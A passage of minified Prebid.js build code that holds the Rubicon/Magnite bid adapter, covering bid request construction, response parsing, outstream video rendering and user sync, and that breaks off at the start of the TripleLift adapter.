    }), t.masSizeOrdering = R, t.determineRubiconVideoSizeId = z, t.getPriceGranularity = T, t.hasValidVideoParams = E, t.hasValidSupplyChainParams = U, t.encodeParam = P, t.resetUserSync = function () {
      N = !1;
    };
    var i = r(0),
      n = r(1),
      o = r(3),
      a = r(2),
      c = r(11),
      s = r.n(c),
      d = r(13),
      u = r(14);
    function p(e, t) {
      var r = Object.keys(e);
      if (Object.getOwnPropertySymbols) {
        var i = Object.getOwnPropertySymbols(e);
        t && (i = i.filter(function (t) {
          return Object.getOwnPropertyDescriptor(e, t).enumerable;
        })), r.push.apply(r, i);
      }
      return r;
    }
    function l(e) {
      for (var t = 1; t < arguments.length; t++) {
        var r = null != arguments[t] ? arguments[t] : {};
        t % 2 ? p(Object(r), !0).forEach(function (t) {
          g(e, t, r[t]);
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : p(Object(r)).forEach(function (t) {
          Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t));
        });
      }
      return e;
    }
    function b() {
      return (b = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var r = arguments[t];
          for (var i in r) Object.prototype.hasOwnProperty.call(r, i) && (e[i] = r[i]);
        }
        return e;
      }).apply(this, arguments);
    }
    function m(e, t) {
      return function (e) {
        if (Array.isArray(e)) return e;
      }(e) || function (e, t) {
        var r = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
        if (null == r) return;
        var i,
          n,
          o = [],
          a = !0,
          c = !1;
        try {
          for (r = r.call(e); !(a = (i = r.next()).done) && (o.push(i.value), !t || o.length !== t); a = !0);
        } catch (e) {
          c = !0, n = e;
        } finally {
          try {
            a || null == r.return || r.return();
          } finally {
            if (c) throw n;
          }
        }
        return o;
      }(e, t) || function (e, t) {
        if (!e) return;
        if ("string" == typeof e) return f(e, t);
        var r = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === r && e.constructor && (r = e.constructor.name);
        if ("Map" === r || "Set" === r) return Array.from(e);
        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return f(e, t);
      }(e, t) || function () {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function f(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var r = 0, i = new Array(t); r < t; r++) i[r] = e[r];
      return i;
    }
    function g(e, t, r) {
      return t in e ? Object.defineProperty(e, t, {
        value: r,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = r, e;
    }
    function v(e) {
      return (v = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    var y = "https://video-outstream.rubiconproject.com/apex-2.0.0.js",
      x = {};
    o.b.getConfig("rubicon", function (e) {
      Object(i.mergeDeep)(x, e.rubicon);
    });
    var h = {
      1: "468x60",
      2: "728x90",
      5: "120x90",
      7: "125x125",
      8: "120x600",
      9: "160x600",
      10: "300x600",
      13: "200x200",
      14: "250x250",
      15: "300x250",
      16: "336x280",
      17: "240x400",
      19: "300x100",
      31: "980x120",
      32: "250x360",
      33: "180x500",
      35: "980x150",
      37: "468x400",
      38: "930x180",
      39: "750x100",
      40: "750x200",
      41: "750x300",
      42: "2x4",
      43: "320x50",
      44: "300x50",
      48: "300x300",
      53: "1024x768",
      54: "300x1050",
      55: "970x90",
      57: "970x250",
      58: "1000x90",
      59: "320x80",
      60: "320x150",
      61: "1000x1000",
      64: "580x500",
      65: "640x480",
      66: "930x600",
      67: "320x480",
      68: "1800x1000",
      72: "320x320",
      73: "320x160",
      78: "980x240",
      79: "980x300",
      80: "980x400",
      83: "480x300",
      85: "300x120",
      90: "548x150",
      94: "970x310",
      95: "970x100",
      96: "970x210",
      101: "480x320",
      102: "768x1024",
      103: "480x280",
      105: "250x800",
      108: "320x240",
      113: "1000x300",
      117: "320x100",
      125: "800x250",
      126: "200x600",
      144: "980x600",
      145: "980x150",
      152: "1000x250",
      156: "640x320",
      159: "320x250",
      179: "250x600",
      195: "600x300",
      198: "640x360",
      199: "640x200",
      213: "1030x590",
      214: "980x360",
      221: "1x1",
      229: "320x180",
      230: "2000x1400",
      232: "580x400",
      234: "6x6",
      251: "2x2",
      256: "480x820",
      257: "400x600",
      258: "500x200",
      259: "998x200",
      264: "970x1000",
      265: "1920x1080",
      274: "1800x200",
      278: "320x500",
      282: "320x400",
      288: "640x380",
      548: "500x1000",
      550: "980x480",
      552: "300x200",
      558: "640x640",
      562: "300x431",
      564: "320x431",
      566: "320x300",
      568: "300x150",
      570: "300x125",
      572: "250x350",
      574: "620x891",
      576: "610x877",
      578: "980x552",
      580: "505x656"
    };
    Object(i._each)(h, function (e, t) {
      return h[e] = t;
    });
    var j = {
      code: "rubicon",
      gvlid: 52,
      supportedMediaTypes: [a.b, a.d],
      isBidRequestValid: function (e) {
        if ("object" !== v(e.params)) return !1;
        for (var t = 0, r = ["accountId", "siteId", "zoneId"]; t < r.length; t++) if (e.params[r[t]] = parseInt(e.params[r[t]]), isNaN(e.params[r[t]])) return Object(i.logError)("Rubicon: wrong format of accountId or siteId or zoneId."), !1;
        var n = w(e, !0);
        return !!n && ("video" !== n || E(e));
      },
      buildRequests: function (e, t) {
        var r = [],
          n = e.filter(function (e) {
            return "video" === w(e);
          }).map(function (e) {
            e.startTime = new Date().getTime();
            var r = {
              id: e.transactionId,
              test: o.b.getConfig("debug") ? 1 : 0,
              cur: ["USD"],
              source: {
                tid: e.transactionId
              },
              tmax: t.timeout,
              imp: [{
                exp: o.b.getConfig("s2sConfig.defaultTtl"),
                id: e.adUnitCode,
                secure: 1,
                ext: g({}, e.bidder, e.params),
                video: Object(i.deepAccess)(e, "mediaTypes.video") || {}
              }],
              ext: {
                prebid: {
                  channel: {
                    name: "pbjs",
                    version: pbjs.version
                  },
                  cache: {
                    vastxml: {
                      returnCreative: !0 === x.returnVast
                    }
                  },
                  targeting: {
                    includewinners: !0,
                    includebidderkeys: !1,
                    pricegranularity: T(o.b)
                  },
                  bidders: {
                    rubicon: {
                      integration: x.int_type || "pbjs"
                    }
                  }
                }
              }
            };
            "rubicon" !== e.bidder && (r.ext.prebid.aliases = g({}, e.bidder, "rubicon"));
            var n,
              c,
              s = Object(u.a)().installedModules;
            if (!s || s.length && -1 === s.indexOf("rubiconAnalyticsAdapter") || Object(i.deepSetValue)(r, "ext.prebid.analytics", {
              rubicon: {
                "client-analytics": !0
              }
            }), "function" != typeof e.getFloor || x.disableFloors) n = parseFloat(Object(i.deepAccess)(e, "params.floor"));else {
              var d;
              try {
                d = e.getFloor({
                  currency: "USD",
                  mediaType: "video",
                  size: A(e, "video")
                });
              } catch (e) {
                Object(i.logError)("Rubicon: getFloor threw an error: ", e);
              }
              n = "object" !== v(d) || "USD" !== d.currency || isNaN(parseInt(d.floor)) ? void 0 : parseFloat(d.floor);
            }
            (isNaN(n) || (r.imp[0].bidfloor = n), r.imp[0].ext[e.bidder].video.size_id = z(e), function (e, t, r) {
              if (!e) return;
              "object" === v(o.b.getConfig("app")) ? e.app = o.b.getConfig("app") : e.site = {
                page: O(t, r)
              };
              "object" === v(o.b.getConfig("device")) && (e.device = o.b.getConfig("device"));
              t.params.video.language && ["site", "device"].forEach(function (r) {
                e[r] && ("site" === r ? e[r].content = b({
                  language: t.params.video.language
                }, e[r].content) : e[r] = b({
                  language: t.params.video.language
                }, e[r]));
              });
            }(r, e, t), function (e, t) {
              "object" === v(e.imp[0].video) && void 0 === e.imp[0].video.skip && (e.imp[0].video.skip = t.params.video.skip);
              "object" === v(e.imp[0].video) && void 0 === e.imp[0].video.skipafter && (e.imp[0].video.skipafter = t.params.video.skipdelay);
              "object" === v(e.imp[0].video) && void 0 === e.imp[0].video.pos && ("atf" === t.params.position ? e.imp[0].video.pos = 1 : "btf" === t.params.position && (e.imp[0].video.pos = 3));
              var r = A(t, "video");
              e.imp[0].video.w = r[0], e.imp[0].video.h = r[1];
            }(r, e), t.gdprConsent) && ("boolean" == typeof t.gdprConsent.gdprApplies && (c = t.gdprConsent.gdprApplies ? 1 : 0), Object(i.deepSetValue)(r, "regs.ext.gdpr", c), Object(i.deepSetValue)(r, "user.ext.consent", t.gdprConsent.consentString));
            t.uspConsent && Object(i.deepSetValue)(r, "regs.ext.us_privacy", t.uspConsent);
            var p = Object(i.deepAccess)(t, "bids.0.userIdAsEids");
            p && p.length && Object(i.deepSetValue)(r, "user.ext.eids", p);
            var l = o.b.getConfig("user.id");
            l && Object(i.deepSetValue)(r, "user.id", l), !0 === o.b.getConfig("coppa") && Object(i.deepSetValue)(r, "regs.coppa", 1), e.schain && U(e.schain) && Object(i.deepSetValue)(r, "source.ext.schain", e.schain);
            var m = o.b.getConfig("multibid");
            return m && Object(i.deepSetValue)(r, "ext.prebid.multibid", m.reduce(function (e, t) {
              var r = {};
              return Object.keys(t).forEach(function (e) {
                r[e.toLowerCase()] = t[e];
              }), e.push(r), e;
            }, [])), S(e, a.d, r), e.storedAuctionResponse && Object(i.deepSetValue)(r.imp[0], "ext.prebid.storedauctionresponse.id", e.storedAuctionResponse.toString()), Object(i.deepSetValue)(r.imp[0], "ext.prebid.auctiontimestamp", t.auctionStart), {
              method: "POST",
              url: "https://".concat(x.videoHost || "prebid-server", ".rubiconproject.com/openrtb2/auction"),
              data: r,
              bidRequest: e
            };
          });
        if (!0 !== x.singleRequest) r = n.concat(e.filter(function (e) {
          return "banner" === w(e);
        }).map(function (e) {
          var r = j.createSlotParams(e, t);
          return {
            method: "GET",
            url: "https://".concat(x.bannerHost || "fastlane", ".rubiconproject.com/a/api/fastlane.json"),
            data: j.getOrderedParams(r).reduce(function (e, t) {
              var n = r[t];
              return Object(i.isStr)(n) && "" !== n || Object(i.isNumber)(n) ? "".concat(e).concat(P(t, n), "&") : e;
            }, "") + "slots=1&rand=".concat(Math.random()),
            bidRequest: e
          };
        }));else {
          var c = e.filter(function (e) {
            return "banner" === w(e);
          }).reduce(function (e, t) {
            return (e[t.params.siteId] = e[t.params.siteId] || []).push(t), e;
          }, {});
          r = n.concat(Object.keys(c).reduce(function (e, r) {
            var n, o;
            return (n = c[r], o = 10, n.map(function (e, t) {
              return t % o == 0 ? n.slice(t, t + o) : null;
            }).filter(function (e) {
              return e;
            })).forEach(function (r) {
              var n = j.combineSlotUrlParams(r.map(function (e) {
                return j.createSlotParams(e, t);
              }));
              e.push({
                method: "GET",
                url: "https://".concat(x.bannerHost || "fastlane", ".rubiconproject.com/a/api/fastlane.json"),
                data: j.getOrderedParams(n).reduce(function (e, t) {
                  var r = n[t];
                  return Object(i.isStr)(r) && "" !== r || Object(i.isNumber)(r) ? "".concat(e).concat(P(t, r), "&") : e;
                }, "") + "slots=".concat(r.length, "&rand=").concat(Math.random()),
                bidRequest: r
              });
            }), e;
          }, []));
        }
        return r;
      },
      getOrderedParams: function (e) {
        var t = /^tg_v/,
          r = /^tg_i/,
          i = /^eid_|^tpid_/,
          n = ["account_id", "site_id", "zone_id", "size_id", "alt_size_ids", "p_pos", "gdpr", "gdpr_consent", "us_privacy", "rp_schain"].concat(Object.keys(e).filter(function (e) {
            return i.test(e);
          })).concat(["x_liverampidl", "ppuid", "rf", "p_geo.latitude", "p_geo.longitude", "kw"]).concat(Object.keys(e).filter(function (e) {
            return t.test(e);
          })).concat(Object.keys(e).filter(function (e) {
            return r.test(e);
          })).concat(["tk_flint", "x_source.tid", "x_source.pchain", "p_screen_res", "rp_floor", "rp_secure", "tk_user_key"]);
        return n.concat(Object.keys(e).filter(function (e) {
          return -1 === n.indexOf(e);
        }));
      },
      combineSlotUrlParams: function (e) {
        if (1 === e.length) return e[0];
        var t = e.reduce(function (t, r, i) {
            return Object.keys(r).forEach(function (n) {
              t.hasOwnProperty(n) || (t[n] = new Array(e.length)), t[n].splice(i, 1, r[n]);
            }), t;
          }, {}),
          r = new RegExp("^([^;]*)(;\\1)+$");
        return Object.keys(t).forEach(function (e) {
          var i = t[e].join(";"),
            n = i.match(r);
          t[e] = n ? n[1] : i;
        }), t;
      },
      createSlotParams: function (e, t) {
        e.startTime = new Date().getTime();
        var r = e.params,
          n = A(e, "banner"),
          c = m(r.latLong || [], 2),
          d = c[0],
          u = c[1],
          p = {
            account_id: r.accountId,
            site_id: r.siteId,
            zone_id: r.zoneId,
            size_id: n[0],
            alt_size_ids: n.slice(1).join(",") || void 0,
            rp_floor: (r.floor = parseFloat(r.floor)) >= .01 ? r.floor : void 0,
            rp_secure: "1",
            tk_flint: "".concat(x.int_type || "pbjs_lite", "_v6.10.0-pre"),
            "x_source.tid": e.transactionId,
            "x_source.pchain": r.pchain,
            p_screen_res: [window.screen.width, window.screen.height].join("x"),
            tk_user_key: r.userId,
            "p_geo.latitude": isNaN(parseFloat(d)) ? void 0 : parseFloat(d).toFixed(4),
            "p_geo.longitude": isNaN(parseFloat(u)) ? void 0 : parseFloat(u).toFixed(4),
            "tg_fl.eid": e.code,
            rf: O(e, t)
          };
        if ("function" == typeof e.getFloor && !x.disableFloors) {
          var l;
          try {
            l = e.getFloor({
              currency: "USD",
              mediaType: "banner",
              size: "*"
            });
          } catch (e) {
            Object(i.logError)("Rubicon: getFloor threw an error: ", e);
          }
          p.rp_hard_floor = "object" !== v(l) || "USD" !== l.currency || isNaN(parseInt(l.floor)) ? void 0 : l.floor;
        }
        var b = {
          1: "atf",
          3: "btf"
        }[Object(i.deepAccess)(e, "mediaTypes.banner.pos")] || "";
        p.p_pos = "atf" === r.position || "btf" === r.position ? r.position : b;
        var f = o.b.getConfig("user.id");
        return f && (p.ppuid = f), e.userIdAsEids && e.userIdAsEids.forEach(function (e) {
          try {
            if ("adserver.org" === e.source ? (p.tpid_tdid = e.uids[0].id, p["eid_adserver.org"] = e.uids[0].id) : "liveintent.com" === e.source ? (p["tpid_liveintent.com"] = e.uids[0].id, p["eid_liveintent.com"] = e.uids[0].id, e.ext && Array.isArray(e.ext.segments) && e.ext.segments.length && (p["tg_v.LIseg"] = e.ext.segments.join(","))) : "liveramp.com" === e.source ? p.x_liverampidl = e.uids[0].id : "id5-sync.com" === e.source ? p["eid_id5-sync.com"] = "".concat(e.uids[0].id, "^").concat(e.uids[0].atype, "^").concat(e.uids[0].ext && e.uids[0].ext.linkType || "") : p["eid_".concat(e.source)] = "".concat(e.uids[0].id, "^").concat(e.uids[0].atype || ""), !p.ppuid) {
              var t = s()(e.uids, function (e) {
                return e.ext && "ppuid" === e.ext.stype;
              });
              t && t.id && (p.ppuid = t.id);
            }
          } catch (t) {
            Object(i.logWarn)("Rubicon: error reading eid:", e, t);
          }
        }), t.gdprConsent && ("boolean" == typeof t.gdprConsent.gdprApplies && (p.gdpr = Number(t.gdprConsent.gdprApplies)), p.gdpr_consent = t.gdprConsent.consentString), t.uspConsent && (p.us_privacy = encodeURIComponent(t.uspConsent)), p.rp_maxbids = t.bidLimit || 1, S(e, a.b, p), !0 === o.b.getConfig("coppa") && (p.coppa = 1), e.schain && U(e.schain) && (p.rp_schain = j.serializeSupplyChain(e.schain)), p;
      },
      serializeSupplyChain: function (e) {
        if (!U(e)) return "";
        var t = e.ver,
          r = e.complete,
          i = e.nodes;
        return "".concat(t, ",").concat(r, "!").concat(j.serializeSupplyChainNodes(i));
      },
      serializeSupplyChainNodes: function (e) {
        var t = ["asi", "sid", "hp", "rid", "name", "domain"];
        return e.map(function (e) {
          return t.map(function (t) {
            return encodeURIComponent(e[t] || "");
          }).join(",");
        }).join("!");
      },
      interpretResponse: function (e, t) {
        var r = t.bidRequest;
        if (!(e = e.body) || "object" !== v(e)) return [];
        if (e.seatbid) {
          var n = Object(i.deepAccess)(e, "ext.errors.rubicon");
          Array.isArray(n) && n.length > 0 && Object(i.logWarn)("Rubicon: Error in video response");
          var o = [];
          return e.seatbid.forEach(function (t) {
            (t.bid || []).forEach(function (n) {
              var c = {
                requestId: r.bidId,
                currency: e.cur || "USD",
                creativeId: n.crid,
                cpm: n.price || 0,
                bidderCode: t.seat,
                ttl: 300,
                netRevenue: !1 !== x.netRevenue,
                width: n.w || Object(i.deepAccess)(r, "mediaTypes.video.w") || Object(i.deepAccess)(r, "params.video.playerWidth"),
                height: n.h || Object(i.deepAccess)(r, "mediaTypes.video.h") || Object(i.deepAccess)(r, "params.video.playerHeight")
              };
              n.id && (c.seatBidId = n.id), n.dealid && (c.dealId = n.dealid), n.adomain && Object(i.deepSetValue)(c, "meta.advertiserDomains", Array.isArray(n.adomain) ? n.adomain : [n.adomain]), Object(i.deepAccess)(n, "ext.bidder.rp.advid") && Object(i.deepSetValue)(c, "meta.advertiserId", n.ext.bidder.rp.advid);
              var s = Object(i.deepAccess)(e, "ext.responsetimemillis.rubicon");
              if (r && s && (r.serverResponseTimeMs = s), Object(i.deepAccess)(n, "ext.prebid.type") === a.d) {
                c.mediaType = a.d, Object(i.deepSetValue)(c, "meta.mediaType", a.d);
                var u = Object(i.deepAccess)(n, "ext.prebid.targeting");
                u && "object" === v(u) && (c.adserverTargeting = u), n.ext.prebid.cache && "object" === v(n.ext.prebid.cache.vastXml) && n.ext.prebid.cache.vastXml.cacheId && n.ext.prebid.cache.vastXml.url ? (c.videoCacheKey = n.ext.prebid.cache.vastXml.cacheId, c.vastUrl = n.ext.prebid.cache.vastXml.url) : u && u.hb_uuid && u.hb_cache_host && u.hb_cache_path && (c.videoCacheKey = u.hb_uuid, c.vastUrl = "https://".concat(u.hb_cache_host).concat(u.hb_cache_path, "?uuid=").concat(u.hb_uuid)), n.adm && (c.vastXml = n.adm), n.nurl && (c.vastUrl = n.nurl), !c.vastUrl && n.nurl && (c.vastUrl = n.nurl), "outstream" === Object(i.deepAccess)(r, "mediaTypes.video.context").toLowerCase() && (c.renderer = function (e) {
                  var t = d.a.install({
                    id: e.adId,
                    url: x.rendererUrl || y,
                    config: x.rendererConfig || {},
                    loaded: !1,
                    adUnitCode: e.adUnitCode
                  });
                  try {
                    t.setRender(_);
                  } catch (e) {
                    Object(i.logWarn)("Prebid Error calling setRender on renderer", e);
                  }
                  return t;
                }(c));
              } else Object(i.logWarn)("Rubicon: video response received non-video media type");
              o.push(c);
            });
          }), o;
        }
        var c,
          s = e.ads,
          u = 0;
        return "object" !== v(r) || Array.isArray(r) || "video" !== w(r) || "object" !== v(s) || (s = s[r.adUnitCode]), !Array.isArray(s) || s.length < 1 ? [] : s.reduce(function (t, n, o) {
          if (n.impression_id && c === n.impression_id ? u++ : c = n.impression_id, "ok" !== n.status) return t;
          var s,
            d,
            p = Array.isArray(r) ? r[o - u] : r;
          if (p && "object" === v(p)) {
            var l = {
              requestId: p.bidId,
              currency: "USD",
              creativeId: n.creative_id || "".concat(n.network || "", "-").concat(n.advertiser || ""),
              cpm: n.cpm || 0,
              dealId: n.deal,
              ttl: 300,
              netRevenue: !1 !== x.netRevenue,
              rubicon: {
                advertiserId: n.advertiser,
                networkId: n.network
              },
              meta: {
                advertiserId: n.advertiser,
                networkId: n.network,
                mediaType: a.b
              }
            };
            if (n.creative_type && (l.mediaType = n.creative_type), n.adomain && (l.meta.advertiserDomains = Array.isArray(n.adomain) ? n.adomain : [n.adomain]), n.creative_type === a.d) l.width = p.params.video.playerWidth, l.height = p.params.video.playerHeight, l.vastUrl = n.creative_depot_url, l.impression_id = n.impression_id, l.videoCacheKey = n.impression_id;else {
              l.ad = (s = n.script, d = n.impression_id, "<html>\n<head><script type='text/javascript'>inDapIF=true;<\/script></head>\n<body style='margin : 0; padding: 0;'>\n\x3c!-- Rubicon Project Ad Tag --\x3e\n<div data-rp-impression-id='".concat(d, "'>\n<script type='text/javascript'>").concat(s, "<\/script>\n</div>\n</body>\n</html>"));
              var b = m(h[n.size_id].split("x").map(function (e) {
                return Number(e);
              }), 2);
              l.width = b[0], l.height = b[1];
            }
            l.rubiconTargeting = (Array.isArray(n.targeting) ? n.targeting : []).reduce(function (e, t) {
              return e[t.key] = t.values[0], e;
            }, {
              rpfl_elemid: p.adUnitCode
            }), t.push(l);
          } else Object(i.logError)("Rubicon: bidRequest undefined at index position:".concat(o), r, e);
          return t;
        }, []).sort(function (e, t) {
          return (t.cpm || 0) - (e.cpm || 0);
        });
      },
      getUserSyncs: function (e, t, r, n) {
        if (!N && e.iframeEnabled) {
          var o = {};
          return r && ("boolean" == typeof r.gdprApplies && (o.gdpr = Number(r.gdprApplies)), "string" == typeof r.consentString && (o.gdpr_consent = r.consentString)), n && (o.us_privacy = encodeURIComponent(n)), o = Object.keys(o).length ? "?".concat(Object(i.formatQS)(o)) : "", N = !0, {
            type: "iframe",
            url: "https://".concat(x.syncHost || "eus", ".rubiconproject.com/usync.html") + o
          };
        }
      },
      transformBidParams: function (e, t) {
        return Object(i.convertTypes)({
          accountId: "number",
          siteId: "number",
          zoneId: "number"
        }, e);
      }
    };
    function O(e, t) {
      var r = o.b.getConfig("pageUrl");
      return e.params.referrer ? r = e.params.referrer : r || (r = t.refererInfo.referer), e.params.secure ? r.replace(/^http:/i, "https:") : r;
    }
    function _(e) {
      var t,
        r = document.getElementById(e.adUnitCode);
      (t = r.querySelector("div[id^='google_ads']")) && t.style.setProperty("display", "none"), function (e) {
        var t = e.querySelector("script[id^='sas_script']"),
          r = t && t.nextSibling;
        r && "iframe" === r.localName && r.style.setProperty("display", "none");
      }(r);
      var i = e.renderer.getConfig();
      e.renderer.push(function () {
        window.MagniteApex.renderAd({
          width: e.width,
          height: e.height,
          vastUrl: e.vastUrl,
          placement: {
            attachTo: "#".concat(e.adUnitCode),
            align: i.align || "center",
            position: i.position || "append"
          },
          closeButton: i.closeButton || !1,
          label: i.label || void 0,
          collapse: i.collapse || !0
        });
      });
    }
    function A(e, t) {
      var r = e.params;
      if ("video" === t) {
        var n = [];
        return r.video && r.video.playerWidth && r.video.playerHeight ? n = [r.video.playerWidth, r.video.playerHeight] : Array.isArray(Object(i.deepAccess)(e, "mediaTypes.video.playerSize")) && 1 === e.mediaTypes.video.playerSize.length ? n = e.mediaTypes.video.playerSize[0] : Array.isArray(e.sizes) && e.sizes.length > 0 && Array.isArray(e.sizes[0]) && e.sizes[0].length > 1 && (n = e.sizes[0]), n;
      }
      var o = [];
      return Array.isArray(r.sizes) ? o = r.sizes : void 0 !== Object(i.deepAccess)(e, "mediaTypes.banner.sizes") ? o = C(e.mediaTypes.banner.sizes) : Array.isArray(e.sizes) && e.sizes.length > 0 ? o = C(e.sizes) : Object(i.logWarn)("Rubicon: no sizes are setup or found"), R(o);
    }
    function S(e, t, r) {
      var n = {
        user: {
          ext: {
            data: l({}, e.params.visitor)
          }
        },
        site: {
          ext: {
            data: l({}, e.params.inventory)
          }
        }
      };
      e.params.keywords && (n.site.keywords = Object(i.isArray)(e.params.keywords) ? e.params.keywords.join(",") : e.params.keywords);
      var c = Object(i.mergeDeep)({}, o.b.getConfig("ortb2") || {}, n),
        s = Object(i.deepAccess)(e.ortb2Imp, "ext.data") || {},
        d = Object(i.deepAccess)(e, "ortb2Imp.ext.gpid"),
        u = {
          user: [4],
          site: [1, 2, 5, 6]
        },
        p = {
          user: "tg_v.",
          site: "tg_i.",
          adserver: "tg_i.dfp_ad_unit_code",
          pbadslot: "tg_i.pbadslot",
          keywords: "kw"
        },
        b = function (e, t, r) {
          if ("data" === t && Array.isArray(e)) return e.filter(function (e) {
            return e.segment && Object(i.deepAccess)(e, "ext.segtax") && u[r] && -1 !== u[r].indexOf(Object(i.deepAccess)(e, "ext.segtax"));
          }).map(function (e) {
            var t = e.segment.filter(function (e) {
              return e.id;
            }).reduce(function (e, t) {
              return e.push(t.id), e;
            }, []);
            if (t.length > 0) return t.toString();
          }).toString();
          if ("object" !== v(e) || Array.isArray(e)) {
            if (void 0 !== e) return Array.isArray(e) ? e.filter(function (e) {
              if ("object" !== v(e) && void 0 !== e) return e.toString();
              Object(i.logWarn)("Rubicon: Filtered value: ", e, "for key", t, ": Expected value to be string, integer, or an array of strings/ints");
            }).toString() : e.toString();
          } else Object(i.logWarn)("Rubicon: Filtered FPD key: ", t, ": Expected value to be string, integer, or an array of strings/ints");
        },
        m = function (e, t, i) {
          var n = !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3],
            o = b(e, i, t),
            a = p[i] && n ? "".concat(p[i]) : "data" === i ? "".concat(p[t], "iab") : "".concat(p[t]).concat(i);
          r[a] = r[a] ? r[a].concat(",", o) : o;
        };
      t === a.b ? (["site", "user"].forEach(function (e) {
        Object.keys(c[e]).forEach(function (t) {
          "site" === e && "content" === t && c[e][t].data ? m(c[e][t].data, e, "data") : "ext" !== t ? m(c[e][t], e, t) : c[e][t].data && Object.keys(c[e].ext.data).forEach(function (t) {
            m(c[e].ext.data[t], e, t, !1);
          });
        });
      }), Object.keys(s).forEach(function (e) {
        "adserver" !== e ? m(s[e], "site", e) : "gam" === s[e].name && m(s[e].adslot, name, e);
      }), d && (r.p_gpid = d), r["tg_i.pbadslot"] && delete r["tg_i.dfp_ad_unit_code"]) : (Object.keys(s).length && Object(i.mergeDeep)(r.imp[0].ext, {
        data: s
      }), d && (r.imp[0].ext.gpid = d), Object(i.mergeDeep)(r, c));
    }
    function C(e) {
      return Object(i.parseSizesInput)(e).reduce(function (e, t) {
        var r = parseInt(h[t], 10);
        return r && e.push(r), e;
      }, []);
    }
    function I(e) {
      return "object" === v(Object(i.deepAccess)(e, "params.video")) && void 0 !== Object(i.deepAccess)(e, "mediaTypes.".concat(a.d));
    }
    function w(e) {
      var t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
      return I(e) ? -1 === ["outstream", "instream"].indexOf(Object(i.deepAccess)(e, "mediaTypes.".concat(a.d, ".context"))) ? void (t && Object(i.logError)("Rubicon: mediaTypes.video.context must be outstream or instream")) : A(e, "video").length < 2 ? void (t && Object(i.logError)("Rubicon: could not determine the playerSize of the video")) : (t && Object(i.logMessage)("Rubicon: making video request for adUnit", e.adUnitCode), "video") : 0 === A(e, "banner").length ? void (t && Object(i.logError)("Rubicon: could not determine the sizes for banner request")) : (t && Object(i.logMessage)("Rubicon: making banner request for adUnit", e.adUnitCode), "banner");
    }
    var k = function () {
      return x = {};
    };
    function R(e) {
      var t = [15, 2, 9];
      return e.sort(function (e, r) {
        var i = t.indexOf(e),
          n = t.indexOf(r);
        return i > -1 || n > -1 ? -1 === i ? 1 : -1 === n ? -1 : i - n : e - r;
      });
    }
    function z(e) {
      var t = parseInt(Object(i.deepAccess)(e, "params.video.size_id"));
      return isNaN(t) ? "outstream" === Object(i.deepAccess)(e, "mediaTypes.".concat(a.d, ".context")) ? 203 : 201 : t;
    }
    function T(e) {
      return {
        ranges: {
          low: [{
            max: 5,
            increment: .5
          }],
          medium: [{
            max: 20,
            increment: .1
          }],
          high: [{
            max: 20,
            increment: .01
          }],
          auto: [{
            max: 5,
            increment: .05
          }, {
            min: 5,
            max: 10,
            increment: .1
          }, {
            min: 10,
            max: 20,
            increment: .5
          }],
          dense: [{
            max: 3,
            increment: .01
          }, {
            min: 3,
            max: 8,
            increment: .05
          }, {
            min: 8,
            max: 20,
            increment: .5
          }],
          custom: e.getConfig("customPriceBucket") && e.getConfig("customPriceBucket").buckets
        }[e.getConfig("priceGranularity")]
      };
    }
    function E(e) {
      var t = !0,
        r = Object.prototype.toString.call([]),
        n = {
          mimes: r,
          protocols: r,
          linearity: Object.prototype.toString.call(0),
          api: r
        };
      return Object.keys(n).forEach(function (r) {
        Object.prototype.toString.call(Object(i.deepAccess)(e, "mediaTypes.video." + r)) !== n[r] && (t = !1, Object(i.logError)("Rubicon: mediaTypes.video." + r + " is required and must be of type: " + n[r]));
      }), t;
    }
    function U(e) {
      var t = !1,
        r = ["asi", "sid", "hp"];
      return e.nodes ? ((t = e.nodes.reduce(function (e, t) {
        return e ? r.every(function (e) {
          return t.hasOwnProperty(e);
        }) : e;
      }, !0)) || Object(i.logError)("Rubicon: required schain params missing"), t) : t;
    }
    function P(e, t) {
      return "rp_schain" === e ? "rp_schain=".concat(t) : "".concat(e, "=").concat(encodeURIComponent(t));
    }
    var N = !1;
    Object(n.registerBidder)(j), window.pbjs.installedModules.push("rubiconBidAdapter");
  }
}, [675]);
pbjsChunk([118], {
  765: function (e, t, r) {
    e.exports = r(766);
  },
  766: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), r.d(t, "tripleliftAdapterSpec", function () {
      return m;
    });
    var n = r(0),
      i = r(2),
      o = r(1),
      u = r(3);
    function c() {
      return (c = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var r = arguments[t];
          for (var n in r) Object.prototype.hasOwnProperty.call(r, n) && (e[n] = r[n]);
        }
        return e;
      }).apply(this, arguments);
    }
    function a(e) {
      return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    function p(e, t) {
      var r = Object.keys(e);
      if (Object.getOwnPropertySymbols) {
        var n = Object.getOwnPropertySymbols(e);
        t && (n = n.filter(function (t) {
          return Object.getOwnPropertyDescriptor(e, t).enumerable;
        })), r.push.apply(r, n);
      }
      return r;
    }
    function d(e) {
      for (var t = 1; t < arguments.length; t++) {
        var r = null != arguments[t] ? arguments[t] : {};
        t % 2 ? p(Object(r), !0).forEach(function (t) {
          s(e, t, r[t]);
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : p(Object(r)).forEach(function (t) {
